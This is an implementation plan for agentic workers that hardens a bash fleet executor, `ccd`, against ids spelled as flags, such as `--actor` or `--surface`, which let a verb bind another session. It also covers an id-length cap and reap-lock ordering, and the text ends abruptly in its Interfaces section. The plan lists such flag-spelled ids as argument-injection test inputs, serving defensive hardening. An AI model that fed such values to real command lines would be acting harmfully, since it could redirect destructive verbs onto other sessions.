# Path identity W1b: ccd's id fix (ids taken whole and never dash-leading, a census-derived id cap, and the collector's reap lock taken after a parse) Implementation Plan

> **For agentic workers:** this plan is dispatched as a wave to a `ccrc-worker` session; follow the `ccrc-worker` skill for the protocol (ack, claims, asks, wave-done). To execute the tasks, REQUIRED SUB-SKILL: superpowers:subagent-driven-development. Steps use checkbox (`- [ ]`) syntax for tracking.

**Programme:** path-identity, **wave 2 of 4** (the spec's W1b). It comes after W1a (run 399, the server's id gate) and before W2 and W3.
- **Run: not opened yet.** The coordinator opens and dispatches it only after workspace-lifecycle wave 6 (#351) merges (R1).
- **Deploy class: AGENT-FIRST.** `ccd/ccd` changes, so the fleet box moves first, which is `ccrc rollout`'s default order. The server box needs nothing from this wave: no server, agent or PWA source changes.

**Goal:** after this wave:
- **No id spelled as a flag binds a verb.**
  - ws-release, ws-archive, ws-restore, ws-hold, ws-rename, ws-reclaim, ws-expire and ws-collect each take an identity key and its value as one pair. The keys are `--session`, plus ws-reclaim's and ws-expire's and ws-collect's `--expect`, ws-reclaim's `--child-of`, ws-hold's positional `--reason`, and ws-rename's `--branch`.
  - A value is never scanned again as a flag.
  - Every post-loop id check refuses a leading `-`, through ONE helper, `_reg_id_ok`.
- **stop and ws-add close their positional redirects.**
  - stop refuses a dash-leading `--surface` value, a dash-leading residue token, and a composed id that `_reg_id_ok` refuses.
  - ws-add refuses a second `--actor` and a dash-leading `--surface` value.
  - A call that spells no id as a flag answers as today, with the same bytes, except where a VALUE itself spells a flag and is now taken whole: a token or run id at the token verbs answers `bad token` or `bad run id` where it answered the usage line (`flag-spelled-token-answers-a-malformed-value`), a ws-rename `--branch` value answers `bad-branch` where the surface word became the new branch name (`rename-branch-value-taken-whole`), and a ws-hold reason is held verbatim where the surface word was held or the usage line answered (`hold-reason-spelling-a-flag-is-held-verbatim`). A call whose id spells a flag may now answer `bad session id` where it answered a usage line or a "needs a value" line. `--actor` and `--reason` prose, and a hold reason, may still begin with `-`.
  - Every identity key now takes its value whole (spec §2.4), so two more inputs change bytes:
    - A token or run id that spells a flag answers `bad token` or `bad run id` where it answered the usage line, and ws-reclaim journals that refusal against the real id. No server builder composes such a token or run id (`flag-spelled-token-answers-a-malformed-value`, Task 2).
    - A hold reason that is itself a flag spelling is held verbatim, where the `--surface` arm ate it or the arity rule refused it (`hold-reason-spelling-a-flag-is-held-verbatim`, Task 4).
- **ccd mints no dash-leading name.**
  - `_ws_project_valid` and `_ws_tmproot_id_ok` refuse a leading `-`. This is gated on Task 0's re-count on both boxes.
  - `ccd enable`'s two-argument form validates its wrapper (`cmd_start`'s own check) and its project before it journals or locks anything.
- **No new id outgrows a name ccd derives from it.**
  - `_REG_ID_MAX` is derived from Task 0's census of every per-id name template, in every file that derives one, and from the coordinator's ruling on the hook's length gates (R27).
  - It caps the composed id at ws-add, start and enable, before anything is created or journaled, with one die line per site.
- **The three token verbs share one id rule.** ws-reclaim, ws-expire and their two audits refuse a dot-leading id at entry, as ws-collect already does.
- **The collector creates no permanent lock for a junk name.**
  - The collect audit and verb open `$REG/.reap-<id>.lock` only after an advisory parse of a witness or record body.
  - A registry peek that reads every row `_ws_collect_registered` reads keeps `registered` ahead of `witness-mismatch`.
- **The proof runs on the real binary.** Three collector header comments are corrected to say what the code does.

**Architecture, by ring:**
- **L0 (`shared/*.ts`): none.** `shared/api.ts` is not edited.
- **L1 policy, L2 ports, L3 adapters, L4 delivery (`server/src/**`): none.** The server's builders and gates belong to W1a.
- **The fleet box's executor.** `ccd/ccd` sits outside the server's rings and is reached only through the agent's exec whitelist. This wave adds:
  - the one id helper, `_reg_id_ok` (Task 1), and `_ws_tmproot_id_ok` re-derived from it (Task 5);
  - the identity arms in ten loops (Tasks 2, 3, 4 and 6);
  - `_ws_project_valid`'s dash line and `cmd_enable`'s project check (Task 5);
  - `_REG_ID_MAX`, `_reg_id_cap` and its reason variable `_REG_ID_CAP_WHY`, with a die line at each of three mint sites (Task 7);
  - the entry rule at the token verbs and their audits (Task 8);
  - `_ws_collect_prelock`, the two judgements it shares with the locked evaluation, and `_ws_collect_slug_askable`, the one source of the dash-free sentence (Task 9);
  - three line-neutral comment carries (Task 11).
- **`ccd/ccrc-doctor-checks`:** one comment, line-neutral (Task 5).
- **Tests (`server/test/**`):** new files per task, and the real-binary matrix (Task 10).
- Then the docs (Task 12) and the whole-branch pass (Task 13).

**Tech Stack:**
- bash ≥ 4.4 under `set -uo pipefail`, with no `-e`;
- `shared/mark.mjs`'s provenance stamp, regenerated with `bash ccd/ccrc restamp ccd/ccd`;
- vitest 4 suites that source ccd through `makeCcdHarness` and `makePrHarness`, and run the real binary under `bash -p`;
- Node ≥ 22.16.0.

**Spec:** `docs/superpowers/specs/2026-10-12-path-identity-design.md`.
- Sections that bind this wave: §2.1, §2.2, §2.4, §2.5, §2.6, §2.7 (SEC1, and SEC3 to SEC7), §2.8, §7 (items 24 to 31) and §8.
- Task 12 writes this wave's as-built notes there.

**Contract:** `docs/superpowers/programs/child-reclamation-contract.md`.
- **§17 (R93 to R98) BINDS this plan** and amends §1 to §16. R93 gives the wave order and per-wave consent, and R98 says to cite code by content.
- The earlier rules it keeps also bind:
  - R23: committed code cites the spec, never the contract.
  - R38: reap locks are never unlinked.
  - R56: the second lander merges `main` and restamps.
- The coordinator's rulings are folded in below. A ruling wins over any task text it names.

**Programme ledger:** `docs/superpowers/programs/path-identity.md`.

**HARD BOUNDARY.** This wave edits only:
- `ccd/ccd`. Its stamp line changes only through `bash ccd/ccrc restamp ccd/ccd`, never by hand.
- `ccd/ccrc-doctor-checks`: one comment in `_check_pools`, line-neutral (Task 5).
- `server/test/**`, as NEW files, plus exactly four existing files. Each is edited only where this wave inverts a pinned behaviour or makes a comment false:
  - `pool-name-parity.test.ts` (Task 5);
  - `ccd-actor-flags.test.ts`, one comment (Task 4);
  - `ccd-workspaces.test.ts`, one comment line edited in place (Task 5);
  - `ccd-project-pool.test.ts`, the one `enable` case that Task 5's wrapper check inverts (Task 5).

  An existing test file outside these four that goes red is NOT edited. The worker names it by slug and STOPs for a coordinator ruling (Task 9 says when this is measured).
- The spec (a new §2.9 and the §7 status cells) and the contract's new "§17 as built (path-identity W1b)" subsection (Task 12).
- This plan's own file under `docs/superpowers/plans/`. It rides in this wave's PR and is committed as the brief directs. The worker does not edit its body.
- The SDD ledger, `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/`. `.superpowers/` is gitignored, so the ledger is never committed and never appears in the diff.

**It never edits:**
- `server/src/**`, `shared/**`, `agent/**`, `pwa/**` or `deploy/**`;
- `ccd/ccrc`, `ccd/session-hook.sh`, `ccd/compact-card.mjs`, `ccd/ccd-entry.py`, or any skill text;
- `README.md`, `CLAUDE.md`, the programme ledger, or the frozen compaction-card corpus (its spec and plan-a);
- `session-hook.test.ts`, `single-definition.test.ts`, `ccd-ws-reap.test.ts`, `ccd-wsaudit-nonpoison.test.ts` or `ccdargv-dec-parity.test.ts`;
- workspace-lifecycle's text in `ccd/ccd`: `_ws_expire_locked` (#351's hunks) and the EXPIRE-V1 note. The EXPIRE-V1 note is reported to that programme, not edited.

**It adds nothing outside `ccd/ccd`'s eight bash names.** It adds no route, table, migration, `cmd_caps` word, ccd verb, agent grant or exec-whitelist entry. It adds no new refusal token, probe word, journal act or sanctioned `die` literal. The eight bash names are in §Interfaces: `_reg_id_ok`, `_REG_ID_MAX`, `_reg_id_cap`, `_REG_ID_CAP_WHY`, `_ws_collect_slug_askable`, `_ws_collect_witness_judge`, `_ws_collect_records_judge` and `_ws_collect_prelock`. A step that seems to need anything else STOPS: name it by slug in the wave-done, and build nothing.

---

## Global Constraints

Each line binds every task.

- **Fixtures and fixture HOMEs only.** No test or scratch command runs ccd against the live `$HOME`. Every ccd call goes through `makeCcdHarness` or `makePrHarness`, or through Task 10's `bash -p` runner with `ghContainedEnv`. Never run a destructive verb outside a fixture HOME. Never touch tmux, `~/.cc-sessions` (Task 0's `ls` counts excepted), `~/.cc-limits` or `claude-session@*.service`. Quote every path, and never pass an unquoted `~` to a ccd verb.
- **The spawn census.** Every new file whose name matches `/^ccd.*\.ts$/` falls under `ccd-workspaces.test.ts`'s containment scan, and that includes Task 10's `ccdargv-dash-id-parity.test.ts`. Every direct `execFileSync('bash'`, `spawnSync('bash'` or `spawn('bash'` in such a file must have `ghContainedEnv(`, `systemd: true` and `tmux: true` in the scan's window around the call.
- **Rings.** No `server/src` or `shared` file changes. Tests import read-only: from `shared/api.js` only in Task 5's parity case (`isTmpRootId`), and from `server/src/ccdargv.js` only in Task 6 (`CCD_ARGV.wsAddWorker`, `ActorFlags`; departure slug `ws-add-dash-test-imports-ccdargv`) and Task 10 (`CCD_ARGV`, `ActorFlags`). ccd keeps its own grammar: no adapter narrows a distinction it received, and no overloaded answer at a seam. A refusal and an unmeasured answer stay two answers.
- **Wire.** No frame, field or capability changes, and no `FLEET_PROTO` bump. ccd's JSON documents keep their shape and their word sets. `collect-readers.test.ts` and `wsaudit.test.ts` stay green unedited.
- **Single definition.**
  - One spelling of the dash rule: `_reg_id_ok`.
  - One spelling of the token verbs' dot-and-dash rule: `_ws_tmproot_id_ok`, derived from `_reg_id_ok`.
  - One cap: `_REG_ID_MAX`, and one cap sentence: `_REG_ID_CAP_WHY`.
  - One copy of the collector's dash-free sentence: `_ws_collect_slug_askable`.
  - The closed surface set stays spelled exactly twice (`ccd-actor-flags.test.ts`).
  - No `'!` and no `"refused":"x"` literal is added (the harvest shapes).
- **Mutation-table discipline.** Every guard ships with a case that goes red when the guard is deleted or mutated, measured before and after the change. A comment is a request; a red suite is a mechanism.
- **Run vitest in the foreground, from the package directory:** `cd server && ./node_modules/.bin/vitest run test/<file>`, with a timeout of at least 600000 ms. Never use bare `npx vitest`. Re-run a CLAUDE.md load flake in isolation before calling it a break.
- **New cases go in NEW files** (R19). An existing file is edited only where the HARD BOUNDARY names it.
- **`shared/api.ts`:** not edited (HARD BOUNDARY). If a step seems to need it, STOP. Should the coordinator ever allow it: declarations go at the foot only, every rewrite above the foot keeps every line number, and session-hook's citation cases are re-run.
- **No `D-` token in a commit message, and no number range anywhere.** Name a departure by slug; the coordinator assigns its number. Commit subjects carry no four-digit line range either.
- **Branch discipline.**
  - One commit per task, on this workspace's own branch. Never a feature branch.
  - Absorb `main` only with `git merge`. On the `ccd/ccd` line-2 conflict, take either side of THAT LINE only, then run `bash ccd/ccrc restamp ccd/ccd`. Never resolve the stamp by hand.
  - Every commit leaves every suite it touches green.
- **The stamp, after every `ccd/ccd` edit:** `bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd`. Then run `ownership.test.ts` and `mark-check.test.ts` before the commit.
- **Line neutrality above the frozen corpus.** The compaction-card corpus pins `ccd/ccd` content up to its highest anchor (`:19131`) through five EXACT census passes in `session-hook.test.ts`.
  - Every edit in a function that starts above `cmd_start()` keeps that function's line count (R9).
  - The passes are re-run whole after every such task: `-t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier'`. No number in them is ever edited to go green.
- **Comments and test titles cite the SPEC** ("path-identity spec §2.4"), never the contract (R23). A backticked `_name` in a `ccd/ccd` comment must exist (the danglers scan).
- **Locate code by CONTENT.** Line numbers in this plan are hints at the export `837a099c0`, before #351.
  - #351 adds 9 lines inside `_ws_expire_locked` and 5 more just after.
  - So export lines from about `:31912` move down 9, and lines from about `:31960` move down 14.
  - Task 0 re-grounds every anchor.
- **Overlaps.**
  - #351 has merged (R1).
  - Workspace-lifecycle's coordinator consents to the three ws-expire edits (Task 0).
  - No live claim may hold `ccd/ccd` or a file this wave creates.
  - `ccd/ccd` edits merge serially. W1a (run 399) and CCR-15 wave 10 (run 400) edit no `ccd/ccd`. If either lands mid-wave, the worker merges `main` and re-points by content.
- **Commands are approval-free:** plain reads, git, grep, sed, awk, node, vitest, and `gh` reads. No `bash -c` with `eval`. Never `pkill` or `killall`; kill only a PID you recorded. A subagent's permission prompt blocks the whole pane, and its mail.
- **Subagents never send mail** and never invoke the `ccrc-worker` skill. Only the worker sends the wave-done.
- **The repository is public.** Nothing goes into code, tests, commits or the PR body that names a host, an absolute home path, a private project, or an account or lane. Use neutral stand-ins such as `<wrapper>`, `the fleet box` and `<projects-root>`.

## Rulings that amend the task text (binding; the coordinator, 2026-10-12)

R1 to R14 are the coordinator's W1b rulings, renumbered. R15 onward were **proposed by the frame** to settle conflicts between the two grounding reports and the critique's findings. The coordinator confirmed every one of them on 2026-10-12 and chose option (a) for R27. They bind exactly as R1 to R14 do.

- **R1 — Timing.**
  - The run opens and dispatches only after #351 merges.
  - Task 0 re-grounds every anchor on that `main`.
  - `ccd/ccd` edits are serial, and each one is restamped with the repo's tool.
- **R2 — `--surface`.**
  - A dash-leading `--surface` value is refused only in `stop` and `ws-add`. These are the two positional-id verbs, and there the rule closes a redirect.
  - The eight `--session` verbs keep their surface grammar.
  - Two spec §2.4 statements are corrected in the as-built note:
    - "`--surface` retains its grammar" holds everywhere except those two verbs;
    - `stop --surface pwa --surface` is refused by the loop's arity check, not by the post-loop id check.
- **R3 — Dots.**
  - `_reg_id_ok` refuses a leading dash only.
  - A dot-leading id is refused at the `ws-reclaim` and `ws-expire` entries, and at their two audits (SEC6, extended to the audits for symmetry with `isRegistryId`).
  - A dot rule on the other verbs is not built. It is recorded as an operator option.
- **R4 — `_reg_id_ok` runs under `LC_ALL=C`**, with its own mutation pin.
- **R5 — stop.** It refuses a dash-leading residue token and applies `_reg_id_ok` to the composed id. Both refusals are a bare `die`.
- **R6 — ws-add** refuses a second `--actor`. The server-side builder reorder is not required.
- **R7 — Order.** The `_ws_project_valid` dash refusal (SEC4, after Task 0's re-count) lands before or with the ws-add task. It is Task 5; ws-add is Task 6.
- **R8 — ws-hold's reason** gets no new cap. The spec's "bounded" sentence is corrected as built: bounded applies only to the `--actor` and `--reason` decision fields.
- **R9 — Line neutrality.**
  - Edits above the citation anchors are line-neutral.
  - The compensation sits inside each loop's own comment, in the window between the function's `local lc_surface=` line and its `--surface)` arm, so no line outside that window moves.
  - **ws-rename is the one exception** (proposed by the frame; confirmed 2026-10-12). Its window holds only `while` and `case`, so it has no comment to fold. Its window is instead its WAVE 5 comment above `local` through the new arm. Folding one line of that comment moves `local`, `while` and `case` up by one, and the arm takes back that line, so nothing after the arm moves. Task 4 records, from the census pass, that no corpus anchor falls in that span.
  - The fallback is a re-measure of the citation census with a composition note (the S6-R11 shape, no deviation number). It needs the coordinator's agreement, recorded in the SDD ledger.
- **R10 — The composed-id cap.**
  - It is derived from Task 0's census of EVERY name template that embeds an id: the quarantine slot, the compaction and hook temp names, and any other. Every such name must fit NAME_MAX, 255.
  - The cap is expected near 175.
  - A test that scans those templates pins it.
  - It applies at every mint site unconditionally, `cmd_start`'s creating form included, with one die line per site.
  - It refines SEC5's derived 222. The ruling's purpose is that no derived name overflows, and 222 fits only the slot name.
  - It was reported to the operator and is reversible before dispatch. If the brief carries an operator reversal to 222, Task 7 builds 222, and the census rows above it become a stated residual.
  - R27 adds a further question this ruling did not see.
- **R11 — `cmd_enable`'s two-argument form calls `_ws_project_valid`** before it journals. It refuses more than today (a departure). Ahead of that call, the same form asks `cmd_start`'s own wrapper check with its words, `_is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"`. So an unrostered or flag-spelled wrapper leaves no `enable` row and no reap lock either (the coordinator's ruling on the first review's enable finding).
- **R12 — The registry peek** before the collect reap lock is kept, so `registered` keeps its precedence.
- **R13 — Item 31's wording** must hold whether or not CCR-15 wave 10 has merged.
- **R14 — Numbers.** W1b's block is allocated when its run opens.
- **R15 — Names and homes (proposed by the frame; confirmed 2026-10-12).** This resolves report A's placement "after `:21072`" against report B's `CCD_ID_MAX`/`_ccd_id_cap`.
  - The new definitions go directly above `_ws_tmproot_id_ok`'s comment block (`# THE ID A WITNESS MAY BE NAMED FOR`, about `:21070`), in this order: `_reg_id_ok`, `_REG_ID_MAX`, `_reg_id_cap` (with `_REG_ID_CAP_WHY`), then `_ws_tmproot_id_ok`'s own comment and line. All of them sit below every frozen anchor.
  - The cap takes the underscore form of `_LC_DEC_MAX`, because a `CCD_*` name reads as an operator's environment knob.
  - In Task 5, `_ws_tmproot_id_ok`'s body becomes `_reg_id_ok "${1-}" && [[ "${1-}" != .* ]]`. That keeps one spelling of the dash rule, rather than report B's `!= [.-]*`.
- **R16 — Who owns the token verbs' entry lines (proposed by the frame; confirmed 2026-10-12).**
  - Task 2 owns the three loops, and writes the dash rule at `ws-reclaim`'s and `ws-expire`'s entries as `_reg_id_ok "$id"`, and at `ws-collect`'s as `_reg_id_ok "$id" && _ws_tmproot_id_ok "$id"`.
  - Task 8 owns the dot rule. It rewrites all three entries to the one call `_ws_tmproot_id_ok "$id" || die "bad session id"`, and writes the two audits' entries.
  - Report A's `.hidden` rows move from its Task 2 to Task 8.
- **R17 — The identity pair stays in the residue (proposed by the frame; confirmed 2026-10-12).**
  - Each identity arm appends the key and its value to the residue, never into a variable.
  - A valueless key falls into the residue alone.
  - So each verb's existing exact-arity and order checks keep refusing a duplicate, a wrong order and a lone key, with today's messages, and the dec ladder still runs before arity.
  - No arm refuses anything itself.
- **R18 — ws-add's rules, exactly (proposed by the frame; confirmed 2026-10-12).**
  - The duplicate rule covers `--actor` in both spellings and any mix of them (R6).
  - The dash-value rule covers `--surface` and `--surface=` (R2).
  - Report A's duplicate rules for `--surface` and `--child` are NOT built. Neither closes a redirect: a project of `--surface` is caught by the dash rule, and one of `--child` by `_child_runid_valid`.
  - Every refusal reuses ws-add's existing usage literal.
- **R19 — New cases go in new files (proposed by the frame; confirmed 2026-10-12).** This resolves report B's `ccd-workspaces.test.ts` placement against report A's new file. The corpus cites `ccd-workspaces.test.ts`, and new files keep this wave clear of every other lane. Spec §2.8 names `ccdargv-dec-parity` as the proof file; this rule moves the proof to `ccdargv-dash-id-parity.test.ts` (departure slug `dash-parity-in-its-own-file`).
- **R20 — The §2.2 verdicts are measured at Task 10 (proposed by the frame; confirmed 2026-10-12).**
  - Spec §8 puts this in Task 0, but Task 0 writes nothing.
  - Task 10's real-binary matrix, both its dec table and its positional table, is run once against the pre-wave `ccd/ccd`. The pre-wave copy is written to a scratch file outside the tree and selected through the test's `DASH_PARITY_CCD` variable, so the tracked `ccd/ccd` is never overwritten. Its per-verb red set is recorded as §8's measurement.
  - Departure slug: `section-2-2-verdicts-measured-at-task-10`.
- **R21 — The pre-lock pass's shape (proposed by the frame; confirmed 2026-10-12).**
  - The dash-free check comes first, through `_ws_collect_slug_askable`, so its sentence has one source.
  - Records come next, as `_ws_collect_fork` orders them.
    - Any record whose body parses (`_ws_collect_record_read` answers 0) and names the id lets the lock open.
    - If records exist but none both parses and names the id, the moved judgement answers, with byte-identical words and details.
  - The witness comes next.
    - A witness that parses lets the lock open, even with no birth time: that `witness-mismatch` stays an under-lock answer for a ccd-written witness.
    - A witness that does not parse first gets the registry peek (R12). The peek answers "no row" only when all three of these hold: `$REG/<id>.child` and `$REG/<id>.uuid` are proven absent by `_ws_reclaim_absent`; a wildcard `"$REG"/tmproot[s]` lists exactly `$REG/tmproots`, the directory the witness was just read from, so a glob of `$REG` is a listing (a readable bit is no such proof: an opendir can still fail while `-r` holds); and `_ws_slug_free "${id%-*}" "${id##*-}"` answers free. That last check covers every `$REG/<id>.<field>` and every dot family, which are the rows `_ws_collect_registered` reads. In every other case the lock opens, and the locked evaluation answers `registered` or unmeasured `registry` as it does today.
  - The pass sets `_WS_COLLECT_RECORDS` for the audit document.
  - It journals nothing itself: the audit document and `_ws_collect_refused` do the journaling.
- **R22 — The audits' dot rule (proposed by the frame; confirmed 2026-10-12).**
  - `cmd_ws_audit`'s id line, above the anchors and edited in place, applies `_ws_tmproot_id_ok` in `--reclaim` mode ONLY. The plain reap audit keeps today's check.
  - `_ws_expire_audit_contained`'s entry becomes `_ws_tmproot_id_ok`.
- **R23 — The restamp spelling (proposed by the frame; confirmed 2026-10-12).** It is `bash ccd/ccrc restamp ccd/ccd`: the checkout's own tool stamping its own file (report B), not an installed launcher (report A).
- **R24 — The as-built homes (proposed by the frame; confirmed 2026-10-12).**
  - The spec gains one subsection, "2.9 As built (W1b)", carrying the corrections R2, R3, R8, R10, R11, R12, R20, R27 and R28 name.
  - Items 24 to 31's Status cells become "Built (W1b)".
  - The contract gains "### §17 as built (path-identity W1b, run <n>)" after R98.
  - W0's decided text is not rewritten.
- **R25 — Task 0's STOP set (proposed by the frame; confirmed 2026-10-12).**
  - These counts STOP the wave: every dash-leading count; a dot-leading `.uuid`; a dash- or dot-leading or dash-free reap lock; a dash-free witness or record; and any id over the derived cap, on either box (the server box's `max-id-len` is compared with the cap once the cap is computed).
  - These are recorded, not STOPs:
    - report B's `uuid-with-double-dash`: a wrapper may legally end in `-`, and `_reg_id_ok` accepts an inner `--`;
    - `pools-dot`: a dot-leading name in `pools/` is that directory's own tmp namespace;
    - `projects-dot`: `_ws_project_valid` already refuses a dot-leading project, so this wave strands none.
- **R26 — Words (proposed by the frame; confirmed 2026-10-12).**
  - No new `die` literal goes in a `ccd-refusal-scan.test.ts` verb body; `die "bad session id"` and the usage literals are reused.
  - stop's two new dies are `die "bad session id: $a"` for the residue and `die "bad session id: $id"` for the composed id.
  - The cap's sentence lives once, in `_REG_ID_CAP_WHY`. Each of the three mint sites writes its own die line, `|| die "$_REG_ID_CAP_WHY — <remedy>; nothing was created"`, as R10 asks. None of those three functions is in a `ccd-refusal-scan` verb body.
  - The `_ws_project_valid` callers' "no LEADING dot or dash" wording is in §Interfaces.
- **R27 — The hook's length gates (proposed by the frame; the coordinator chose (a) on 2026-10-12).**
  - `ccd/session-hook.sh` already bounds ids and projects: `CCRC_ID_MAX=128` and `CCRC_PROJ_MAX=64`.
    - A peer id longer than 128 is skipped by the peer census (`session-hook.test.ts` pins that skip).
    - A session whose project (or, when `.project` is empty, its id) is longer than 64 gets no card from `_ct_probe`.
    - `.project` reads are bounded at `CCRC_ID_MAX` characters.
  - With a cap near 174, an id of 129 to 174 bytes can be minted and then be invisible to the hook's peer census. R10 and the operator's "near 175" were decided without this fact.
  - The two options, of which the coordinator chose **(a)** on 2026-10-12, because an id the hook skips is a session that silently loses its card and its peer listing, which is the overflow the cap exists to prevent:
    - (a) `_REG_ID_MAX` = min(255 − W, `CCRC_ID_MAX`), that is 128, read from the hook's text by Task 7's test; or
    - (b) `_REG_ID_MAX` = 255 − W, with the stated residual `ids-over-128-invisible-to-the-hook-peer-census`.
  - Under either choice, `projects-over-64-get-no-hook-card` is a stated residual, because the cap bounds the composed id, not the project.
  - Task 0 records every id consumer's length gate next to the name census. Task 12 records the outcome.
- **R28 — The collect verb's pre-lock answers precede the pause (proposed by the frame; confirmed 2026-10-12).**
  - The verb reads the pause under the lock, before its evaluation (`_ws_collect_locked`). A pre-lock `witness-mismatch`, `quarantine-kept` or unmeasured answer now comes ahead of `paused`. The answer is terminal for junk either way, and nothing moves.
  - Departure slug: `collect-verb-prelock-refusal-precedes-the-pause`, pinned by a Task 9 row.

## Review Focus (the five failure modes most likely to bite)

1. **A flag-spelled id still binds another session.**
   - Input: the server's composed argv for each verb, with an id of `--actor`, `--surface`, `--reason`, `--expect`, `--defer-expired`, `--session`, `--branch` or `--child-of`, under a dec with and without a reason. stop is tried in both builder orders, and stopPair, forget, swap, start, enable and every ws-audit mode are tried positionally.
   - Expected: a refusal before any lock, journal line or act, with the decoy rows `agent` and `pwa` untouched. The one stated exception is plain ws-audit, which audits the literal id.
   - Pinned by Tasks 2, 3, 4 and 6, and by Task 10's real-binary matrix.
2. **The fix narrows what it must not.**
   - Input: `--actor`, `--reason` or a hold reason beginning with `-`; flags in any position; a lone trailing key; a dot-leading id at the five `--session` verbs.
   - Expected: accepted, or refused, exactly as today, with today's bytes. The one exception is a hold reason that is itself a flag spelling: it is now held verbatim (`hold-reason-spelling-a-flag-is-held-verbatim`), where the server's argv held the surface word. The two stated exceptions are the Goal's: a token or run id spelled as a flag, and a hold reason that is itself a flag spelling.
   - Pinned by Task 1's `.hidden` row, Task 4's prose rows, and every existing suite run unedited.
3. **A line moves under the frozen corpus.**
   - Input: any edit in a function that starts above `cmd_start()`.
   - Expected: each such function above R15's insertion point (`# THE ID A VERB MAY BIND`) still starts on its `origin/main` line. A function between that point and `cmd_start()` moves only by the lines R15's helpers add (Task 1 Step 9, Task 13 (3b)). Every line-neutral task leaves every start where its pre-task `HEAD` had it. The five census passes stay green with no number edited.
   - Pinned by session-hook's passes in Tasks 4, 5, 6 and 13, and by Task 13's start-line table.
4. **The collector's pre-lock pass changes an answer, or still creates a lock for junk.**
   - Input: a junk witness, a junk record, two records, a well-formed record naming another id, a record whose `~/.cc-tmp` cannot be resolved, a dash-free id, a junk witness beside a live `.uuid`, `.hold`, `.reaping` or dot-family row, a junk witness beside an unlistable registry, a junk witness with the pause standing, a sound witness, a sound record.
   - Expected: junk answers before the lock, with today's word and detail and no `.reap-<id>.lock`. A row of any kind still answers `registered`, with nothing journaled. Sound input still takes the lock.
   - Pinned by Task 9.
5. **A new id overflows a derived name, or a refusal leaves debris.**
   - Input: an id one past the cap at ws-add (positional slug and `CCD_WS_SLUG`), at start (even when the row exists) and at enable; a dash- or dot-leading project at enable.
   - Expected: refused before the worktree, the branch, the `.uuid`, the supervised start and the `enable` journal row.
   - Pinned by Tasks 5 and 7. Task 0 STOPs on anything that would be stranded.

---

## File Structure

Every file this wave touches. Each task's own **Files** block stays the authority for what it does there.

| File | Task(s) |
|---|---|
| `ccd/ccd` | 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 (each restamps) |
| `ccd/ccrc-doctor-checks` | 5 (one comment, line-neutral) |
| `server/test/dashIdFixture.ts` (new) | 1 (created), 2, 3, 4, 6, 8, 10 (consume) |
| `server/test/ccd-reg-id-ok.test.ts` (new) | 1 |
| `server/test/ccd-token-verbs-dash-id.test.ts` (new) | 2 |
| `server/test/ccd-stop-dash-id.test.ts` (new) | 3 |
| `server/test/ccd-session-verbs-dash-id.test.ts` (new) | 4 |
| `server/test/ccd-actor-flags.test.ts` | 4 (the ws-hold "does NOT strip --reason" case's mutant comment, reworded; assertion unchanged) |
| `server/test/ccd-project-dash.test.ts` (new) | 5 |
| `server/test/pool-name-parity.test.ts` | 5 (`-lead` inverted, with the exact-table comment; one new `it` for the dash line; header, describe title, the "leading-dash ones" case, the "two ENDS" comment, the "ccd really creates" case and the hostile-name case's opening comment rewritten) |
| `server/test/ccd-workspaces.test.ts` | 5 (one comment line, in place: "which `_ws_project_valid` accepts") |
| `server/test/ccd-project-pool.test.ts` | 5 (the "leading --cross-pool on `enable`" case inverted: enable now refuses the wrapper before it journals) |
| `server/test/ccd-ws-add-dash-id.test.ts` (new) | 6 |
| `server/test/ccd-id-cap.test.ts` (new) | 7 |
| `server/test/ccd-token-verbs-dot-id.test.ts` (new) | 8 |
| `server/test/ccd-collect-prelock.test.ts` (new) | 9 |
| `server/test/ccdargv-dash-id-parity.test.ts` (new) | 10 |
| `server/test/ccd-collect-header-prose.test.ts` (new) | 11 |
| `server/test/path-identity-w1b-prose.test.ts` (new) | 12 |
| `docs/superpowers/specs/2026-10-12-path-identity-design.md` | 12 (§2.9 and §7 status cells) |
| `docs/superpowers/programs/child-reclamation-contract.md` | 12 ("§17 as built" only) |
| this plan, under `docs/superpowers/plans/` | rides in the PR as the brief directs; its body is not edited |

## Execution order and dependencies

Task 0 → 1 → 2 → 3 → 4 → 5 → 6 → 7 → 8 → 9 → 10 → 11 → 12 → 13. Strictly serial: Tasks 1 to 11 each edit and restamp `ccd/ccd`. Each task is one commit, and every commit leaves every suite it touches green.

| Task | Needs | Model routing | Why this place |
|---|---|---|---|
| 0 Entry conditions | — | `sonnet`, medium | Proves #351 is in, re-grounds anchors, counts both boxes, and takes the name census and the consumer length gates the cap is derived from |
| 1 `_reg_id_ok` | 0 | `sonnet`, high | Every later id check calls it; one line and a truth table |
| 2 The token verbs' loops | 1 | `opus`, xhigh | SAFETY: the verbs that delete, and the lock a junk id creates today |
| 3 stop | 1, 2 | `opus`, high | The only positional-id verb that redirects; below the anchors |
| 4 The five upper `--session` verbs | 1, 2, 3 | `opus`, xhigh | The live redirects (release, archive, restore), and line-neutral above the corpus |
| 5 Predicates | 1, Task 0's counts | `opus`, high | R7: it must precede ws-add; it inverts pool-name-parity |
| 6 ws-add | 5 | `opus`, high | The project's dash is refused by 5; this closes the flag spellings |
| 7 The composed-id cap | 5, 6 | `opus`, high | Edits the same two mint sites as 5 and 6, and `cmd_start` |
| 8 The no-dot-leading entry rule | 2, 4, 5 | `opus`, high | Needs `_ws_tmproot_id_ok` to refuse a dash (5), or Task 2's dash rule would be lost |
| 9 The collect reap lock after a parse | 8 | `opus`, xhigh | SAFETY: changes when a permanent lock is created, and the order of answers |
| 10 Real-binary parity | 2 to 9 | `opus`, high | Green only once every loop and predicate is in; its red run is §8's measurement |
| 11 Comment carries | 9, 10 | `sonnet`, medium | The same collector region as 9; line-neutral |
| 12 Docs | 1 to 11 | `sonnet`, high | Writes what was built, and the corrections R24 names |
| 13 Whole-branch verification and the PR | 0 to 12 | `sonnet`, high | The wave-done's `suite:` line |

---

## Interfaces (canonical)

Every name the tasks share. A later task uses exactly these names and contracts. Each "replaces" note says which grounding-report spelling is void.

### `ccd/ccd` (the fleet box's executor; outside the server rings)

**`_reg_id_ok WORD`** (Task 1; directly above `_ws_tmproot_id_ok`'s comment block, R15).
- Contract: rc 0 iff WORD matches `^[A-Za-z0-9._-]+$` under `LC_ALL=C` and does not begin with `-`. rc 1 otherwise. No output; it never dies.
- Exact text:
